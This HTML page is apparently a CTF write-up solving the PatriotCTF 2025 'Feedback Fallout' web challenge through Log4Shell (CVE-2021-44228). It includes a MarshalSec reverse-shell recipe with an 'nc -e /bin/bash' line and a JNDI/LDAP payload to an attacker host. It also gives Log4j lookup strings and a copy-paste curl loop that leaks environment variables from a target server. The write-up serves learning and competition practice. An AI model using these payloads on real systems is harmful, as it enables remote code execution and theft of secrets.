<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Feedback Fallout â€¢ syndro</title>
<script> 
    (function() {
      const saved = localStorage.getItem('theme');
      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
      else document.documentElement.classList.remove('light');
    })();
  </script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&amp;family=Roboto+Mono:wght@300;400;700&amp;display=swap" rel="stylesheet"/>
<link href="../../style.css" rel="stylesheet"/>
<style>
    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
    .light { --accent: #1f6feb; --green: #238636; }

    body {
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #e6edf3;
      font-family: 'Roboto Mono', monospace;
      min-height: 100vh;
      padding: 40px 20px;
      line-height: 1.8;
      transition: background 0.5s, color 0.5s;
    }
    .light body { background: #f6f8fa; color: #0d1117; }

    .container { max-width: 1100px; margin: 0 auto; }

    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 4.8rem;
      text-align: center;
      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin: 20px 0 10px;
      text-shadow: 0 0 30px rgba(88,166,255,0.3);
    }
    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }

    .meta { text-align: center; opacity: 0.85; font-size: 1.2rem; margin-bottom: 60px; }
    .meta span { color: var(--accent); font-weight: bold; }

    h2 { color: var(--accent); margin: 50px 0 20px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }

    pre {
      background: #161b22 !important;
      color: #f0f6fc !important;
      padding: 20px;
      border-radius: 14px;
      overflow-x: auto;
      border: 1px solid #30363d;
      font-size: 1.05rem;
      margin: 25px 0;
      white-space: pre-wrap;
    }
    .light pre {
      background: #f6f8fa !important;
      color: #24292f !important;
      border: 1px solid #d0d7de !important;
    }

    code {
      background: rgba(88,166,255,0.1);
      padding: 4px 10px;
      border-radius: 8px;
      color: var(--green);
    }
    .light code { background: rgba(30,110,254,0.15); }

    img {
      display: block;
      max-width: 100%;
      border-radius: 16px;
      margin: auto;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
      border: 2px solid rgba(88,166,255,0.3);
      cursor: zoom-in;
      transition: transform 0.3s ease;
    }
    .light img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
    img:hover { transform: scale(1.02); }

    .flag {
      background: rgba(0,255,0,0.1);
      padding: 30px;
      border-radius: 16px;
      font-size: 1.8rem;
      text-align: center;
      margin: 60px 0;
      color: var(--green);
      font-weight: bold;
      border: 3px dashed var(--green);
      font-family: 'Roboto Mono', monospace;
      letter-spacing: 1px;
    }
    .light .flag { background: rgba(35,134,54,0.08); border-color: #238636; }

    .back {
      position: fixed;
      top: 30px;
      left: 30px;
      background: var(--accent);
      color: #000;
      padding: 16px 42px;
      border-radius: 50px;
      font-weight: bold;
      text-decoration: none;
      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
      transition: all 0.4s ease;
      z-index: 9999;
      font-size: 1.1rem;
    }
    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
    .light .back { color: white; }

    .modal {
      display: none;
      position: fixed;
      z-index: 9999;
      left: 0; top: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.95);
      backdrop-filter: blur(10px);
      align-items: center;
      justify-content: center;
      padding: 20px;
      cursor: zoom-out;
    }
    .modal.active { display: flex; }
    .modal img {
      max-width: 95%;
      max-height: 95vh;
      border-radius: 16px;
      box-shadow: 0 0 100px rgba(88,166,255,0.6);
    }
    .close-modal {
      position: absolute;
      top: 30px; right: 40px;
      font-size: 4rem;
      color: white;
      background: rgba(255,255,255,0.1);
      width: 70px; height: 70px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: 0.3s;
    }
    .close-modal:hover { background: rgba(255,255,255,0.3); transform: scale(1.1); }

    @media (max-width: 768px) {
      h1 { font-size: 3.5rem; }
      .back { position: static; display: block; margin: 30px auto; width: fit-content; }
      .close-modal { top: 15px; right: 15px; font-size: 3rem; }
    }
      .theme-toggle {
      position: fixed;
      top: 30px;
      right: 30px;
      z-index: 9999;
      background: var(--card);
      color: var(--accent);
      border: 2px solid var(--accent);
      padding: 14px 28px;
      border-radius: 50px;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      box-shadow: 0 0 25px rgba(88,166,255,0.5);
      transition: all 0.3s ease;
      backdrop-filter: blur(10px);
    }
    .theme-toggle:hover {
      background: var(--accent);
      color: #000;
      transform: scale(1.08);
      box-shadow: 0 0 40px rgba(88,166,255,0.8);
    }
  </style>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/><style id="wh-unified-style">
/* ===== cyber-whisperer unified writeup UI (blue-ish) ===== */
body.wh-writeup{
  --wh-accent: #58a6ff;
  --wh-accent2:#06b6d4;
  --wh-surface: rgba(13,17,23,.62);
  --wh-surface2: rgba(17,24,39,.55);
  --wh-border: rgba(88,166,255,.22);
  --wh-text: #e6edf3;
  --wh-muted: rgba(230,237,243,.72);
  --wh-shadow: rgba(0,0,0,.55);
  background:
    radial-gradient(1200px 700px at 12% 10%, rgba(88,166,255,.22), transparent 55%),
    radial-gradient(900px 650px at 88% 18%, rgba(6,182,212,.18), transparent 52%),
    radial-gradient(950px 680px at 50% 92%, rgba(139,92,246,.16), transparent 58%),
    linear-gradient(135deg,#070a16,#111a33 45%,#07101f);
  color: var(--wh-text);
  padding: 70px 18px 60px;
  min-height: 100vh;
  overflow-x: hidden;
}

html.light body.wh-writeup{
  --wh-accent:#1f6feb;
  --wh-accent2:#0891b2;
  --wh-surface: rgba(255,255,255,.78);
  --wh-surface2: rgba(255,255,255,.66);
  --wh-border: rgba(31,111,235,.20);
  --wh-text: #0d1117;
  --wh-muted: rgba(13,17,23,.70);
  --wh-shadow: rgba(0,0,0,.12);
  background:
    radial-gradient(1200px 700px at 12% 10%, rgba(31,111,235,.18), transparent 55%),
    radial-gradient(900px 650px at 88% 18%, rgba(8,145,178,.14), transparent 52%),
    radial-gradient(950px 680px at 50% 92%, rgba(124,58,237,.12), transparent 58%),
    linear-gradient(180deg,#f8fafc,#eef2ff);
}

body.wh-writeup::before{
  content:"";
  position: fixed;
  inset:0;
  pointer-events:none;
  z-index:-1;
  background-image:
    linear-gradient(rgba(88,166,255,.10) 1px, transparent 1px),
    linear-gradient(90deg, rgba(88,166,255,.10) 1px, transparent 1px);
  background-size: 86px 86px;
  opacity:.22;
  mask-image: radial-gradient(circle at 50% 35%, rgba(0,0,0,.95) 0, rgba(0,0,0,0) 70%);
}

#whProgress{
  position: fixed;
  top:0; left:0;
  width:100%;
  height:4px;
  z-index:100000;
  background: rgba(255,255,255,.06);
}
#whProgress > div{
  height:100%;
  width:0%;
  background: linear-gradient(90deg, var(--wh-accent), var(--wh-accent2), #8b5cf6);
  box-shadow: 0 0 20px rgba(88,166,255,.45);
}

.wh-shell{
  max-width: 1500px;
  margin: 0 auto;
  display: grid;
  grid-template-columns: minmax(0, 1fr) 320px;
  gap: 22px;
  align-items: start;
}
@media (max-width: 1150px){
  .wh-shell{ grid-template-columns: 1fr; }
}

body.wh-writeup .container{
  max-width: 100% !important;
  margin: 0 !important;
  padding: 28px 28px 32px !important;
  border-radius: 26px;
  background: linear-gradient(180deg, var(--wh-surface), var(--wh-surface2));
  border: 1px solid var(--wh-border);
  box-shadow: 0 24px 80px var(--wh-shadow);
  backdrop-filter: blur(14px);
  position: relative;
}

body.wh-writeup .container::after{
  content:"";
  position:absolute;
  inset:0;
  border-radius:26px;
  pointer-events:none;
  background: radial-gradient(600px 220px at 30% 0%, rgba(88,166,255,.14), transparent 60%);
  opacity: .8;
}

body.wh-writeup h1{
  letter-spacing: .5px;
  margin-top: 6px !important;
}

body.wh-writeup .meta{
  color: var(--wh-muted) !important;
  margin-bottom: 16px !important;
}

body.wh-writeup .topbar{
  position: sticky;
  top: 14px;
  z-index: 9999;
  display:flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
  padding: 12px 12px;
  border-radius: 18px;
  background: rgba(0,0,0,.18);
  border: 1px solid rgba(255,255,255,.10);
  backdrop-filter: blur(12px);
  box-shadow: 0 14px 40px rgba(0,0,0,.25);
  margin: 14px 0 28px !important;
}
html.light body.wh-writeup .topbar{ background: rgba(255,255,255,.55); border-color: rgba(31,111,235,.12); }

body.wh-writeup .btn{
  border: 1px solid rgba(88,166,255,.28) !important;
  background: rgba(88,166,255,.10) !important;
  color: inherit !important;
  padding: 10px 14px !important;
  border-radius: 999px !important;
  cursor: pointer;
  font-family: inherit;
  transition: transform .18s ease, box-shadow .18s ease, background .18s ease, border-color .18s ease;
  text-decoration: none;
  display: inline-flex;
  align-items: center;
  gap: 8px;
  user-select: none;
}
body.wh-writeup .btn:hover{
  transform: translateY(-1px);
  background: rgba(88,166,255,.16) !important;
  border-color: rgba(88,166,255,.55) !important;
  box-shadow: 0 18px 45px rgba(88,166,255,.18);
}

body.wh-writeup .btn.wh-primary{
  background: linear-gradient(90deg, rgba(88,166,255,.22), rgba(6,182,212,.20)) !important;
  border-color: rgba(88,166,255,.55) !important;
}

body.wh-writeup h2, body.wh-writeup h3, body.wh-writeup .toc{ scroll-margin-top: 120px; }

.wh-aside{
  position: sticky;
  top: 92px;
}
@media (max-width:1150px){
  .wh-aside{ position: relative; top: 0; }
}

.wh-aside-card{
  border-radius: 22px;
  padding: 18px 16px;
  background: linear-gradient(180deg, rgba(13,17,23,.55), rgba(17,24,39,.45));
  border: 1px solid rgba(88,166,255,.20);
  box-shadow: 0 18px 60px rgba(0,0,0,.35);
  backdrop-filter: blur(12px);
}
html.light .wh-aside-card{ background: rgba(255,255,255,.65); border-color: rgba(31,111,235,.14); box-shadow: 0 18px 60px rgba(0,0,0,.10); }

.wh-aside-title{
  font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
  font-weight: 700;
  letter-spacing: .2px;
  color: var(--wh-text);
  margin: 2px 6px 10px;
  opacity: .92;
}

#whToc a{
  display:flex;
  gap:10px;
  align-items: baseline;
  padding: 9px 10px;
  border-radius: 14px;
  border: 1px solid transparent;
  text-decoration:none;
  color: var(--wh-muted);
  font-size: .98rem;
  line-height: 1.2;
}
#whToc a:hover{
  color: var(--wh-text);
  border-color: rgba(88,166,255,.20);
  background: rgba(88,166,255,.10);
}
#whToc a.active{
  color: var(--wh-text);
  border-color: rgba(88,166,255,.38);
  background: rgba(88,166,255,.16);
}
#whToc .wh-dot{
  width: 8px; height: 8px;
  border-radius: 50%;
  margin-top: 3px;
  background: rgba(88,166,255,.30);
  flex: 0 0 auto;
}
#whToc a.active .wh-dot{ background: rgba(88,166,255,.90); box-shadow: 0 0 18px rgba(88,166,255,.55); }

/* Make images & code blocks feel less "floating" */
body.wh-writeup pre{ box-shadow: 0 18px 60px rgba(0,0,0,.35) !important; }
html.light body.wh-writeup pre{ box-shadow: 0 18px 60px rgba(0,0,0,.08) !important; }

/* Subtle section dividers */
body.wh-writeup h2{
  position: relative;
  padding-bottom: 10px;
}
body.wh-writeup h2::after{
  content:"";
  position:absolute;
  left:0;
  bottom: 0;
  width: 120px;
  height: 2px;
  background: linear-gradient(90deg, var(--wh-accent), transparent);
  opacity: .85;
}
</style></head>
<body class="wh-writeup"><div id="whProgress"><div></div></div>
<a class="back" href="https://syndro-1.github.io/page/CTF/PatriotCTF2025/patriotctf2025">Back</a>

<div class="wh-shell"><div class="container">
<h1>Feedback Fallout</h1>
<div class="meta">PatriotCTF 2025 â€¢ <span>Web</span> â€¢ syndro</div><div class="topbar wh-auto-topbar"><button class="btn wh-primary" id="themeToggle" type="button">ðŸŒ“ Toggle theme</button></div>
<h2>0. The challenge description</h2>
<p>The challenge description is interesting. It mentions an old Java version, which could be an old exploit.</p>
<img alt="Challenge Description" src="Pic/FeedbackFallout/1.png"/>
<h2>1. The Feedback page.</h2>
<p>The moment I entered the page, there was nothing other than a simple feedback Textarea.</p>
<img alt="Feedback form" src="Pic/FeedbackFallout/2.png"/>
<p>I inspected the source and Network tab â†’ nothing useful.</p>
<h2>2. Discovering the Vulnerability</h2>
<p>Intercepted the POST request with ZAP and saw our feedback being logged directly on the server response:</p>
<img alt="ZAP intercept" src="Pic/FeedbackFallout/3.png"/>
<p>So I started googling about Logs exploit, and then I remembered, <code>"Logs four"</code> at the bottom of the feedback page, which could lead to something.</p>
<img alt="Challenge hint!" src="Pic/FeedbackFallout/6.png"/>
<p>I came across an old Java vulnerability, <code>Log4Shell (CVE-2021-44228)</code></p>
<p>I Tried to get a reverse shell using <code>Marshalsec</code></p>
<pre><code>
      How MarshalSec works:
      1 - You have a netcat listener on your Attacker Machine
      2 - You set up a SimpleHTTPServer on your Attacker Machine, usually done with Python.
      3 - You set up an LDAP server using Marshalsec 
      4 - You host an old-version Java .class which executes any command u want, for a reverse shell for our NC "nc -e /bin/bash OUR-IP OUR-NC-PORT"
      5 - You send a JNDI/ldap to access that Exploit.class on your Attacker Machine.
      6 - Final Payload : ${jndi:ldap//YOUR-IP:1389/Exploit.class}
    </code></pre>
<p>But, whatever I did, I could never get a reverse shell using <code>JNDI</code>. Perhaps it's disabled in that version.</p>
<p>So, I tried a Basic syntax</p>
<pre><code>${java:version}</code></pre>
<img alt="Java version leaked" src="Pic/FeedbackFallout/4.png"/>
<p>So, Since <code>JNDI</code> Is disabled, AND the java still leaks info, What if i just bruteforce <code>${env:KEY}</code></p>
<pre><code>Common syntaxes:
- ${sys:os.name}
- ${sys:user.name}
- ${log4j:configParentLocation}
- ${env:PATH}
- ${env:HOSTNAME}
- ${java:version}</code></pre>
<h2>3. The Exploit</h2>
<p>Threw together a quick for-loop to brute-force common env variable names containing the flag:</p>
<pre><code>for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do 
  echo "Trying ${env:$i}"
  curl -s -X POST http://18.212.136.134:8080/feedback \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
    -d "feedback=${env:$i}" | grep -o "User .*"
done</code></pre>
<img alt="Flag found" src="Pic/FeedbackFallout/5.png"/>
<p>One-liner version (copy-paste ready):</p>
<pre><code>for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying ${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=${env:$i}" | grep -o "User .*"; done</code></pre>
<div class="flag">
      PCTF{cant_****}
    </div>
<p>Log4Shell.</p>
</div><aside class="wh-aside"><div class="wh-aside-card"><div class="wh-aside-title">On this page</div><nav id="whToc"></nav></div></aside></div>
<!-- IMAGE ZOOM MODAL -->
<div class="modal" id="imageModal">
<span class="close-modal">Ã—</span>
<img alt="Zoomed image" id="modalImage" src=""/>
</div>
<script type="text/javascript">
var sc_project=13192699;
var sc_invisible=1;
var sc_security="f34343e1";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost+
"statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript>
<div class="statcounter">
<img alt="statcounter" class="statcounter" src="https://c.statcounter.com/13192699/0/f34343e1/1/"/>
</div>
</noscript>
<script>
  const modal = document.getElementById('imageModal');
  const modalImg = document.getElementById('modalImage');

  document.querySelectorAll('img').forEach(img => {
    if (img.closest('#imageModal')) return;
    img.onclick = () => {
      modalImg.src = img.src;
      modal.classList.add('active');
      document.body.style.overflow = 'hidden';
    };
  });

  modal.addEventListener('click', (e) => {
    if (e.target === modal || e.target.classList.contains('close-modal')) {
      modal.classList.remove('active');
      document.body.style.overflow = '';
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && modal.classList.contains('active')) {
      modal.classList.remove('active');
      document.body.style.overflow = '';
    }
  });

  document.getElementById('themeToggle')?.addEventListener('click', () => {
    document.documentElement.classList.toggle('light');
    localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
  });
</script>
<script id="wh-unified-script">
(function(){
  // Progress bar
  const bar = document.querySelector('#whProgress > div');
  const updateProgress = () => {
    if(!bar) return;
    const doc = document.documentElement;
    const scrollTop = doc.scrollTop || document.body.scrollTop;
    const height = (doc.scrollHeight - doc.clientHeight) || 1;
    const pct = Math.min(100, Math.max(0, (scrollTop / height) * 100));
    bar.style.width = pct.toFixed(2) + '%';
  };
  window.addEventListener('scroll', updateProgress, {passive:true});
  updateProgress();

  // Ensure we only have ONE working theme toggle (remove older listeners by cloning)
  const original = document.getElementById('themeToggle');
  if (original) {
    const clone = original.cloneNode(true);
    original.parentNode.replaceChild(clone, original);
    clone.addEventListener('click', () => {
      document.documentElement.classList.toggle('light');
      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
    });
  }

  // Auto-topbar chips (only for pages that opted-in)
  const topbar = document.querySelector('.topbar.wh-auto-topbar');
  if(topbar){
    const makeSlug = (s) => (s || '').toLowerCase()
      .replace(/^[0-9]+\s*[\)|\.]\s*/,'')
      .replace(/[^a-z0-9\s-]/g,'')
      .trim().replace(/\s+/g,'-').slice(0,60) || ('section-' + Math.random().toString(16).slice(2));

    const pickEmoji = (t) => {
      const s = (t||'').toLowerCase();
      if(s.includes('goal')) return 'ðŸŽ¯';
      if(s.includes('host')) return 'ðŸ§©';
      if(s.includes('recon') || s.includes('nmap') || s.includes('scan')) return 'ðŸ›°ï¸';
      if(s.includes('enum') || s.includes('fuzz') || s.includes('dir')) return 'ðŸ§ª';
      if(s.includes('login') || s.includes('auth')) return 'ðŸ”';
      if(s.includes('api')) return 'ðŸ§­';
      if(s.includes('ssrf')) return 'ðŸ•³ï¸';
      if(s.includes('ssti')) return 'ðŸ§¨';
      if(s.includes('ftp')) return 'ðŸ“¦';
      if(s.includes('pcap') || s.includes('wireshark')) return 'ðŸ¦ˆ';
      if(s.includes('ssh')) return 'ðŸ—ï¸';
      if(s.includes('priv') || s.includes('privesc')) return 'âš¡';
      if(s.includes('flag')) return 'ðŸ';
      if(s.includes('exploit') || s.includes('rce')) return 'ðŸ’¥';
      if(s.includes('sql')) return 'ðŸ§¬';
      if(s.includes('xss')) return 'ðŸ§·';
      return 'ðŸ“Œ';
    };

    const container = document.querySelector('.container');
    const anchors = [];

    const goals = container?.querySelector('.toc#goals');
    if(goals) anchors.push({el: goals, label: 'Goals'});

    (container ? Array.from(container.querySelectorAll('h2')) : []).forEach(h => {
      anchors.push({el: h, label: h.textContent || 'Section'});
    });

    // Create chips after the theme toggle button
    const themeBtn = topbar.querySelector('#themeToggle');
    anchors.forEach(({el, label}) => {
      if(!el.id) el.id = makeSlug(label);
      const clean = (label||'').replace(/^[0-9]+\s*[\)|\.]\s*/,'').trim();
      const a = document.createElement('a');
      a.className = 'btn';
      a.href = '#' + el.id;
      a.textContent = pickEmoji(clean) + ' ' + (clean.length>24 ? clean.slice(0,24)+'â€¦' : clean);
      // insert after theme button (keep toggle first)
      if(themeBtn && themeBtn.nextSibling) topbar.insertBefore(a, themeBtn.nextSibling);
      else topbar.appendChild(a);
    });
  }

  // Right-side TOC (all writeups)
  const toc = document.getElementById('whToc');
  const container = document.querySelector('.container');
  if(toc && container){
    const makeSlug = (s) => (s || '').toLowerCase()
      .replace(/^[0-9]+\s*[\)|\.]\s*/,'')
      .replace(/[^a-z0-9\s-]/g,'')
      .trim().replace(/\s+/g,'-').slice(0,60) || ('section-' + Math.random().toString(16).slice(2));

    const sections = [];
    const goals = container.querySelector('.toc#goals') || container.querySelector('.toc');
    if(goals){
      if(!goals.id) goals.id = 'goals';
      sections.push({el: goals, title: 'Goals'});
    }
    container.querySelectorAll('h2').forEach(h => {
      if(!h.id) h.id = makeSlug(h.textContent);
      const title = (h.textContent||'').replace(/^[0-9]+\s*[\)|\.]\s*/,'').trim();
      sections.push({el: h, title: title || 'Section'});
    });

    toc.innerHTML='';
    sections.forEach((s) => {
      const a = document.createElement('a');
      a.href = '#' + s.el.id;
      a.innerHTML = `<span class="wh-dot"></span><span>${s.title.length>32 ? s.title.slice(0,32)+'â€¦' : s.title}</span>`;
      toc.appendChild(a);
    });

    const links = Array.from(toc.querySelectorAll('a'));
    const setActive = (id) => {
      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#'+id));
    };

    const obs = new IntersectionObserver((entries) => {
      const visible = entries
        .filter(e => e.isIntersecting)
        .sort((a,b) => b.intersectionRatio - a.intersectionRatio)[0];
      if(visible) setActive(visible.target.id);
    }, { root: null, threshold: [0.2,0.35,0.55], rootMargin: '-20% 0px -70% 0px' });

    sections.forEach(s => obs.observe(s.el));
    setActive(sections[0]?.el?.id || '');
  }
})();
</script></body>
</html>
